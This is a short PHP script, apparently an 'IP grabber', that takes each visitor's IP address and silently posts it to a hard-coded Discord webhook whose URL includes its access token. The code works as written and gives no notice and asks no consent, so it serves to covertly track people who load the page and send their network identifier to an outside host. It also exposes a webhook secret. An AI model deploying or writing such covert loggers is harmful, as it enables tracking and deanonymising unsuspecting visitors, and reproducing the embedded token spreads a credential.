<?php

$ip = $_SERVER['REMOTE_ADDR'];

$data = array('content' => "Visitor's IP address: $ip");
$options = array(
    'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
    ),
);

$context  = stream_context_create($options);
$result = file_get_contents('https://discord.com/api/webhooks/1055847703743045673/ZspEhLYtC1iCdx6jRxa9Q6OqDYulKNHk8vp0FdSPe_7GtQx0YOCSwJe7uu2D_xT_67JE', false, $context);

?>
